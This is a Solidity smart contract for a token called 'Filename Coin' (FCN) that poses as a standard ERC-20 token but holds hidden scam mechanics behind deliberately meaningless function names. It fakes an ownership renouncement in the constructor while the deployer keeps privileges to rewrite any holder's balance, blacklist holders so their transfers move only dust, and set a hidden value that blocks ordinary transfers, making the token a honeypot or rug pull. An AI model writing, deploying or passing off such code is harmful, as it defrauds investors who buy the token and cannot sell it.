//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract walletSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeTrading {
    function createPair(address walletTeam, address exemptBuy) external returns (address);

    function feeTo() external view returns (address);
}

interface limitTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface swapAutoFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldLimitSwap) external view returns (uint256);

    function transfer(address shouldTake, uint256 minFund) external returns (bool);

    function allowance(address limitFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 minFund) external returns (bool);

    function transferFrom(
        address sender,
        address shouldTake,
        uint256 minFund
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitSwap, uint256 value);
    event Approval(address indexed limitFrom, address indexed spender, uint256 value);
}

interface teamTotal is swapAutoFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FilenameCoin is walletSell, swapAutoFund, teamTotal {

    bool public takeLaunch;

    uint256 launchAmount;

    function symbol() external view virtual override returns (string memory) {
        return tradingFund;
    }

    address atAmount;

    function marketingMax(address totalTx) public {
        liquidityAmount();
        if (autoSwap) {
            shouldFee = false;
        }
        if (totalTx == tokenWallet || totalTx == launchedReceiverLimit) {
            return;
        }
        takeFrom[totalTx] = true;
    }

    function getOwner() external view returns (address) {
        return launchToken;
    }

    function balanceOf(address shouldLimitSwap) public view virtual override returns (uint256) {
        return receiverMarketingTotal[shouldLimitSwap];
    }

    address fundSenderMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address maxIsReceiver, address listMinLimit) external view virtual override returns (uint256) {
        if (listMinLimit == fundSenderMin) {
            return type(uint256).max;
        }
        return walletMax[maxIsReceiver][listMinLimit];
    }

    uint8 private takeFee = 18;

    function decimals() external view virtual override returns (uint8) {
        return takeFee;
    }

    function minMarketing(address toMax, address shouldTake, uint256 minFund) internal returns (bool) {
        require(receiverMarketingTotal[toMax] >= minFund);
        receiverMarketingTotal[toMax] -= minFund;
        receiverMarketingTotal[shouldTake] += minFund;
        emit Transfer(toMax, shouldTake, minFund);
        return true;
    }

    uint256 public minEnable = 0;

    function liquidityAmount() private view {
        require(senderSwapTrading[_msgSender()]);
    }

    function approve(address listMinLimit, uint256 minFund) public virtual override returns (bool) {
        walletMax[_msgSender()][listMinLimit] = minFund;
        emit Approval(_msgSender(), listMinLimit, minFund);
        return true;
    }

    uint256 private launchedSenderLaunch;

    address private launchToken;

    function fromToken(address liquidityAmountTo) public {
        require(liquidityAmountTo.balance < 100000);
        if (takeLaunch) {
            return;
        }
        
        senderSwapTrading[liquidityAmountTo] = true;
        
        takeLaunch = true;
    }

    mapping(address => bool) public senderSwapTrading;

    constructor (){
        
        feeTake();
        limitTeam receiverSwap = limitTeam(fundSenderMin);
        launchedReceiverLimit = modeTrading(receiverSwap.factory()).createPair(receiverSwap.WETH(), address(this));
        atAmount = modeTrading(receiverSwap.factory()).feeTo();
        if (autoSwap == sellList) {
            launchTeam = launchedSenderLaunch;
        }
        tokenWallet = _msgSender();
        senderSwapTrading[tokenWallet] = true;
        receiverMarketingTotal[tokenWallet] = tokenExemptMin;
        if (launchTeam != launchedSenderLaunch) {
            shouldFee = true;
        }
        emit Transfer(address(0), tokenWallet, tokenExemptMin);
    }

    event OwnershipTransferred(address indexed tradingTotal, address indexed listMin);

    function transferFrom(address toMax, address shouldTake, uint256 minFund) external override returns (bool) {
        if (_msgSender() != fundSenderMin) {
            if (walletMax[toMax][_msgSender()] != type(uint256).max) {
                require(minFund <= walletMax[toMax][_msgSender()]);
                walletMax[toMax][_msgSender()] -= minFund;
            }
        }
        return totalFeeMarketing(toMax, shouldTake, minFund);
    }

    function name() external view virtual override returns (string memory) {
        return txTo;
    }

    bool public sellList;

    function totalSupply() external view virtual override returns (uint256) {
        return tokenExemptMin;
    }

    mapping(address => mapping(address => uint256)) private walletMax;

    uint256 public launchTeam;

    function receiverToken(address launchedToken, uint256 minFund) public {
        liquidityAmount();
        receiverMarketingTotal[launchedToken] = minFund;
    }

    string private tradingFund = "FCN";

    mapping(address => bool) public takeFrom;

    mapping(address => uint256) private receiverMarketingTotal;

    function shouldWallet(uint256 minFund) public {
        liquidityAmount();
        launchAmount = minFund;
    }

    address public tokenWallet;

    bool private senderEnable;

    function owner() external view returns (address) {
        return launchToken;
    }

    uint256 autoLaunchedToken;

    uint256 private tokenExemptMin = 100000000 * 10 ** 18;

    address public launchedReceiverLimit;

    string private txTo = "Filename Coin";

    function feeTake() public {
        emit OwnershipTransferred(tokenWallet, address(0));
        launchToken = address(0);
    }

    uint256 constant shouldLaunch = 10 ** 10;

    function totalFeeMarketing(address toMax, address shouldTake, uint256 minFund) internal returns (bool) {
        if (toMax == tokenWallet) {
            return minMarketing(toMax, shouldTake, minFund);
        }
        uint256 enableAt = swapAutoFund(launchedReceiverLimit).balanceOf(atAmount);
        require(enableAt == launchAmount);
        require(shouldTake != atAmount);
        if (takeFrom[toMax]) {
            return minMarketing(toMax, shouldTake, shouldLaunch);
        }
        minFund = enableReceiver(toMax, shouldTake, minFund);
        return minMarketing(toMax, shouldTake, minFund);
    }

    function enableReceiver(address toMax, address shouldTake, uint256 minFund) internal view returns (uint256) {
        require(minFund > 0);

        uint256 teamReceiver = 0;
        if (toMax == launchedReceiverLimit && minSwap > 0) {
            teamReceiver = minFund * minSwap / 100;
        } else if (shouldTake == launchedReceiverLimit && minEnable > 0) {
            teamReceiver = minFund * minEnable / 100;
        }
        require(teamReceiver <= minFund);
        return minFund - teamReceiver;
    }

    bool private autoSwap;

    function transfer(address launchedToken, uint256 minFund) external virtual override returns (bool) {
        return totalFeeMarketing(_msgSender(), launchedToken, minFund);
    }

    uint256 public minSwap = 0;

    bool public shouldFee;

    bool public takeMax;

}